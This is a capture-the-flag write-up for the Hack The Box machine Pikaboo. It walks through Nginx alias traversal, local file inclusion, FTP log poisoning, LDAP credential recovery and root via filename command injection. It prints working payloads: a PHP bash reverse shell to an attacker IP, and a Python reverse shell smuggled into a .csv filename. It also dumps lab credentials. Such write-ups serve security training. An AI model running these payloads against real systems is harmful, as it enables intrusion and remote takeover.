> Authors: **[pwnmeow][author-profile-1] & [polarbearer][author-profile-2]**

## Discovery

### Port Scanning

```bash
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

### Directory Enumeration

```bash
/images               (Status: 301) [Size: 319] [--> http://10.10.10.249/images/]
/admin                (Status: 401) [Size: 456]
/administrator        (Status: 401) [Size: 456]
/admincp              (Status: 401) [Size: 456]
/administration       (Status: 401) [Size: 456]
/admin_c              (Status: 401) [Size: 456]
/admin2               (Status: 401) [Size: 456]
/admins               (Status: 401) [Size: 456]
/adminpanel           (Status: 401) [Size: 456]
/administracion       (Status: 401) [Size: 456]
/admin1               (Status: 401) [Size: 456]
/adminsite            (Status: 401) [Size: 456]
/admintemplates       (Status: 401) [Size: 456]
/administracja        (Status: 401) [Size: 456]
/administrador        (Status: 401) [Size: 456]
/admintools           (Status: 401) [Size: 456]
/admini               (Status: 401) [Size: 456]
/admin_area           (Status: 401) [Size: 456]
/admin3               (Status: 401) [Size: 456]
/adminarea            (Status: 401) [Size: 456]
/admin_new            (Status: 401) [Size: 456]
/adminm               (Status: 401) [Size: 456]
/admina               (Status: 401) [Size: 456]
/adminpages           (Status: 401) [Size: 456]
/admin_old            (Status: 401) [Size: 456]
/admin_               (Status: 401) [Size: 456]
/adminlogin           (Status: 401) [Size: 456]
/adminv2              (Status: 401) [Size: 456]
/administrators       (Status: 401) [Size: 456]
/admin_images         (Status: 401) [Size: 456]
/adminka              (Status: 401) [Size: 456]
/adminweb             (Status: 401) [Size: 456]
/adminonline          (Status: 401) [Size: 456]
/admintool            (Status: 401) [Size: 456]
/admin_login          (Status: 401) [Size: 456]
/admin_tools          (Status: 401) [Size: 456]
/administrare         (Status: 401) [Size: 456]
/adminx               (Status: 401) [Size: 456]
/admin_test           (Status: 401) [Size: 456]
/admin-login          (Status: 401) [Size: 456]
/adminonly            (Status: 401) [Size: 456]
/admin2009            (Status: 401) [Size: 456]
/admin_menu           (Status: 401) [Size: 456]
/admin_files          (Status: 401) [Size: 456]
/adminis              (Status: 401) [Size: 456]
/adminold             (Status: 401) [Size: 456]
/admin12              (Status: 401) [Size: 456]
/admin123             (Status: 401) [Size: 456]
/admin_cms            (Status: 401) [Size: 456]
/admin_media          (Status: 401) [Size: 456]
/admin_cp             (Status: 401) [Size: 456]
/admin_custom         (Status: 401) [Size: 456]
/admin_navigation     (Status: 401) [Size: 456]
/admin_panel          (Status: 401) [Size: 456]
/adminz               (Status: 401) [Size: 456]
/administratie        (Status: 401) [Size: 456]
/admin-panel          (Status: 401) [Size: 456]
/admin-old            (Status: 401) [Size: 456]
/admin_news           (Status: 401) [Size: 456]
/admin_common         (Status: 401) [Size: 456]
/admin00              (Status: 401) [Size: 456]
/admin_scripts        (Status: 401) [Size: 456]
/admin_site           (Status: 401) [Size: 456]
/admin_user           (Status: 401) [Size: 456]
/admincenter          (Status: 401) [Size: 456]
/admincms             (Status: 401) [Size: 456]
/adminfiles           (Status: 401) [Size: 456]
/administracao        (Status: 401) [Size: 456]
/administrasjon       (Status: 401) [Size: 456]
/administrace         (Status: 401) [Size: 456]
/adminn               (Status: 401) [Size: 456]
/administer           (Status: 401) [Size: 456]
/adminmaster          (Status: 401) [Size: 456]
/administrative       (Status: 401) [Size: 456]
/admin888             (Status: 401) [Size: 456]
/admin4               (Status: 401) [Size: 456]
/admin_tool           (Status: 401) [Size: 456]
/admin_101            (Status: 401) [Size: 456]
/admin_templates      (Status: 401) [Size: 456]
/admincpanel          (Status: 401) [Size: 456]
/admin_users          (Status: 401) [Size: 456]
/adminbereich         (Status: 401) [Size: 456]
/admin_web            (Status: 401) [Size: 456]
/adminer              (Status: 401) [Size: 456]
/adminnorthface       (Status: 401) [Size: 456]
/adminlinks           (Status: 401) [Size: 456]
/administracija       (Status: 401) [Size: 456]
/adminforum           (Status: 401) [Size: 456]
/administra           (Status: 401) [Size: 456]
/admindemo            (Status: 401) [Size: 456]
/adminpp              (Status: 401) [Size: 456]
/adminstaff           (Status: 401) [Size: 456]
/adminzone            (Status: 401) [Size: 456]
/adminuser            (Status: 401) [Size: 456]
/admin-admin          (Status: 401) [Size: 456]
/admin99              (Status: 401) [Size: 456]
/admin88              (Status: 401) [Size: 456]
/adminED              (Status: 401) [Size: 456]
/adminPanel           (Status: 401) [Size: 456]
/admin_db             (Status: 401) [Size: 456]
/admin_bk             (Status: 401) [Size: 456]
/adminTeb             (Status: 401) [Size: 456]
/admin_manage         (Status: 401) [Size: 456]
/admin_en             (Status: 401) [Size: 456]
/admin_backup         (Status: 401) [Size: 456]
/admin_online         (Status: 401) [Size: 456]
/admin_netref         (Status: 401) [Size: 456]
/admin_pr             (Status: 401) [Size: 456]
/admin_review         (Status: 401) [Size: 456]
/admin_save           (Status: 401) [Size: 456]
/adminasp             (Status: 401) [Size: 456]
/adminbeta            (Status: 401) [Size: 456]
/admin_util           (Status: 401) [Size: 456]
/adminc               (Status: 401) [Size: 456]
/admincrud            (Status: 401) [Size: 456]
/adminguide           (Status: 401) [Size: 456]
/adminclude           (Status: 401) [Size: 456]
/adminhome            (Status: 401) [Size: 456]
/administrate         (Status: 401) [Size: 456]
/administrateur       (Status: 401) [Size: 456]
/admininterface       (Status: 401) [Size: 456]
/administrator2       (Status: 401) [Size: 456]
/administrativo       (Status: 401) [Size: 456]
/adminjsp             (Status: 401) [Size: 456]
/adminnew             (Status: 401) [Size: 456]
/adminnews            (Status: 401) [Size: 456]
/adminp               (Status: 401) [Size: 456]
/adminpage            (Status: 401) [Size: 456]
/adminpro             (Status: 401) [Size: 456]
/adminsys             (Status: 401) [Size: 456]
/adminroot            (Status: 401) [Size: 456]
/adminradii           (Status: 401) [Size: 456]
/adminsql             (Status: 401) [Size: 456]
/admintest            (Status: 401) [Size: 456]
/adminth              (Status: 401) [Size: 456]
/adminxxx             (Status: 401) [Size: 456]
/adminhtml            (Status: 401) [Size: 456]
/administratsiya      (Status: 401) [Size: 456]
```

All the directories starting with `admin` seem to point to the same page,
which points toward the common alias misconfiguration of Nginx.

It can be exploited to traverse the directories:

```bash
ffuf -u http://10.10.10.249/admin../FUZZ \
    -w /usr/share/wordlists/discovery/raft-small-words.txt \
    -o discovery/files.admin.txt
# admin                   [Status: 401, Size: 456, Words: 42, Lines: 15, Duration: 101ms]
# .html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 76ms]
# .htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 114ms]
# .php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 114ms]
# javascript              [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 95ms]
# .                       [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 75ms]
# .htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 98ms]
# .phtml                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 66ms]
# .htc                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 73ms]
# .html_var_DE            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 115ms]
# server-status           [Status: 200, Size: 4118, Words: 241, Lines: 86, Duration: 85ms]
# .htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 123ms]
# .html.                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 86ms]
# .html.html              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 87ms]
# .htpasswds              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 75ms]
# .htm.                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 93ms]
# .htmll                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 86ms]
# .phps                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 76ms]
# .html.old               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 71ms]
# .ht                     [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 93ms]
# .html.bak               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 106ms]
# .htm.htm                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 64ms]
# .htgroup                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 64ms]
# .hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 80ms]
# .html1                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 83ms]
# .html.LCK               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 77ms]
# .html.printable         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 80ms]
# .htm.LCK                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 100ms]
# .htaccess.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 70ms]
# .htmls                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 73ms]
# .html.php               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 78ms]
# .htx                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 77ms]
# .htuser                 [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 104ms]
# .htlm                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 121ms]
# .html-                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 108ms]
# .htm2                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 109ms]
```

```bash
ffuf -u http://10.10.10.249/admin../FUZZ \
    -w /usr/share/wordlists/discovery/raft-small-directories.txt \
    -o discovery/directories.admin.txt
# admin                   [Status: 401, Size: 456, Words: 42, Lines: 15, Duration: 83ms]
# javascript              [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 79ms]
# server-status           [Status: 200, Size: 5103, Words: 257, Lines: 102, Duration: 75ms]
```

`server-status` and `admin_staging` hit. And the dashboard explicitely loads
local files via the URL:

> `http://10.10.10.249/admin../admin_staging/index.php?page=tables.php#`

Let's fuzz further and look for LFI, with the help of the [list by hussein98d][lfi-wordlist]:

```bash
ffuf -u 'http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ' \
    -w ~/downloads/lfi.txt -fl 368 \
    -o discovery/files.lfi.admin.txt
# /var/log/vsftpd.log     [Status: 200, Size: 19803, Words: 3893, Lines: 414, Duration: 96ms]
```


### Web Browsing

The webserver displays a list of "Pokatmon", but the interactions are not yet
implemented. The API is supposed to be located at `http://10.10.10.249/pokeapi.php?id=5`.

![][pokatdex]

The server status is available through Nginx misconfiguration:

![][server-status]

## Break-in

The user `pwnmeow` is mentionned in the log.

Also, [this article][vsftpd-log-poisoning] explains how to poison the log:

```bash
ftp 10.10.10.249
# Connected to 10.10.10.249.
# 220 (vsFTPd 3.0.3)
# Name (10.10.10.249:gully): <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.50/9999 0>&1'"); ?>
# 331 Please specify the password.
# Password: 
# 530 Login incorrect.
# ftp: Login failed.
nc -lvnp 9999
curl "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
```

Since the username appears verbatim in the log, this works as expected.

## Lateral Movement

The staging app has no config file, but the production does:

```bash
grep -ia password /opt/pokeapi/config/settings.py 
        # "PASSWORD": "J~42%W?PFHl]g",
grep -ia secret /opt/pokeapi/config/settings.py 
# SECRET_KEY = "4nksdock439320df*(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
# SECRET_KEY = os.environ.get(
#     "SECRET_KEY", "ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
cat /opt/pokeapi/config/settings.py
# ADMINS = (("Paul Hallett", "paulandrewhallett@gmail.com"),)
# EMAIL_BACKEND = "django.core.mail.backends.console.EmailBackend"
# MANAGERS = ADMINS
# BASE_URL = "http://pokeapi.co"
# SECRET_KEY = "4nksdock439320df*(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
# DATABASES = {
#     "ldap": {
#         "ENGINE": "ldapdb.backends.ldap",
#         "NAME": "ldap:///",
#         "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
#         "PASSWORD": "J~42%W?PFHl]g",
#     },
#     "default": {
#         "ENGINE": "django.db.backends.sqlite3",
#         "NAME": "/opt/pokeapi/db.sqlite3",
#     }
# }
# SECRET_KEY = os.environ.get(
#     "SECRET_KEY", "ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
# )
```

```bash
cat /usr/local/bin/csvupdate_cron
```

```bash
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

```bash
cat /usr/local/bin/csvupdate
```

These parts are especially interesting:

```perl
my $csv_dir = "/opt/pokeapi/data/v2/csv";
my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";
```

If we manage somehow manage to login as `pwnmeow`, we could upload malicious
files to the CSV directory of the `pokeapi` and exploit the open command.

So the first step is to find the credentials for pwnmeow.

```bash
grep -riaoH password /opt/pokeapi/
# /opt/pokeapi/.github/workflows/docker-image.yml:password
# /opt/pokeapi/Resources/compose/docker-compose-prod-graphql.yml:PASSWORD
# /opt/pokeapi/Resources/compose/docker-compose-prod-graphql.yml:PASSWORD
# /opt/pokeapi/Resources/compose/docker-compose-prod-graphql.yml:PASSWORD
# /opt/pokeapi/Resources/docker/app/README.md:PASSWORD
# /opt/pokeapi/docker-compose.yml:PASSWORD
# /opt/pokeapi/docker-compose.yml:PASSWORD
# /opt/pokeapi/docker-compose.yml:PASSWORD
# /opt/pokeapi/docker-compose.yml:PASSWORD
# /opt/pokeapi/docker-compose.yml:PASSWORD
# /opt/pokeapi/config/docker.py:PASSWORD
# /opt/pokeapi/config/settings.py:PASSWORD
# /opt/pokeapi/config/docker-compose.py:PASSWORD
# /opt/pokeapi/config/docker-compose.py:PASSWORD
grep -riaoH secret /opt/pokeapi/
# /opt/pokeapi/.github/workflows/docker-image.yml:secret
# /opt/pokeapi/.github/workflows/docker-image.yml:secret
# /opt/pokeapi/Makefile:SECRET
# /opt/pokeapi/Makefile:secret
# /opt/pokeapi/Makefile:SECRET
# /opt/pokeapi/Makefile:secret
# /opt/pokeapi/Makefile:SECRET
# /opt/pokeapi/.git/modules/data/v2/sprites/index:secret
# /opt/pokeapi/.git/modules/data/v2/sprites/index:secret
# /opt/pokeapi/.git/modules/data/v2/sprites/index:secret
# /opt/pokeapi/.git/modules/data/v2/sprites/index:secret
# /opt/pokeapi/Resources/compose/docker-compose-prod-graphql.yml:SECRET
# /opt/pokeapi/Resources/compose/docker-compose-prod-graphql.yml:SECRET
# /opt/pokeapi/docker-compose.yml:SECRET
# /opt/pokeapi/docker-compose.yml:SECRET
# /opt/pokeapi/config/settings.py:SECRET
# /opt/pokeapi/config/settings.py:SECRET
# /opt/pokeapi/config/settings.py:SECRET
# /opt/pokeapi/config/__pycache__/settings.cpython-37.pyc:SECRET
# /opt/pokeapi/apollo.config.js:secret
cat /opt/pokeapi/config/docker.py
# DATABASES = {
#     "default": {
#         "ENGINE": "django.db.backends.postgresql_psycopg2",
#         "NAME": "pokeapi",
#         "USER": "ash",
#         "PASSWORD": "pokemon",
#         "HOST": "localhost",
#         "PORT": "",
#     }
# }
```

First, let's try and enumerate the LDAP with the credentials above:

```bash
ldapsearch -x -LLL -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb' -s sub '(objectClass=*)'
# dn: dc=ftp,dc=pikaboo,dc=htb
# objectClass: domain
# dc: ftp

# dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
# objectClass: organizationalUnit
# objectClass: top
# ou: users

# dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
# objectClass: organizationalUnit
# objectClass: top
# ou: groups

# dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
# objectClass: inetOrgPerson
# objectClass: posixAccount
# objectClass: shadowAccount
# uid: pwnmeow
# cn: Pwn
# sn: Meow
# loginShell: /bin/bash
# uidNumber: 10000
# gidNumber: 10000
# homeDirectory: /home/pwnmeow
# userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d -w 0
# _G0tT4_C4tcH_'3m_4lL!_
```

> `_G0tT4_C4tcH_'3m_4lL!_`

## Escalation

So now we can use the FTP vector to try and exploit `csvupdate`. Since the call
to `open` has no filter on the user input, it will execute system calls:

```bash
touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.16.50\"",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("\"sh\"")';.csv"
ftp 10.10.10.249
```

This will create a file ending in `.csv` so that it is processed by the
update script. And the name is the command to be executed.

[author-profile-1]: https://app.hackthebox.com/users/157669
[author-profile-2]: https://app.hackthebox.com/users/159204

[lfi-wordlist]: https://github.com/hussein98d/LFI-files/
[nginx-misconfiguration]: https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/
[pokatdex]: images/screenshots/pokatdex.png
[server-status]: images/screenshots/server-status.png
[vsftpd-log-poisoning]: https://secnhack.in/ftp-log-poisoning-through-lfi/
